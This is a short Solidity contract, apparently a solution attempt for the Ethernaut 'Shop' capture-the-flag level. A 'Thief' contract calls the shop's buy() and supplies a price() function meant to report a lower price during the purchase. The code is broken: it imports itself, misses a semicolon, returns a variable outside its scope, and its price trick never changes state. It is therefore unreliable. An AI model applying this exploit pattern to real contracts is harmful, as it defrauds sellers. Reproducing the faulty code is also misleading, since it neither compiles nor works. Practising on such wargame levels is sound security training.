//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import './Thief.sol'

interface Shop {
    function buy() external;
}

library StaticProof {
    function juke(bool _a) public returns (bool) {
        bool a = _a;
        return a;
    }
}

contract Thief {
    using StaticProof for bool;
    bool a;

    function steal(address $your_ethernaut_address_here) public {
        Shop shop = Shop($your_ethernaut_address_here);
        shop.buy();
    }

    function price() external view returns (uint) {
        bool _a = StaticProof.juke(a);
        if (!_a) {
            uint result = 102;
        } else {
            uint result = 0;
        }
        return result;
    }
}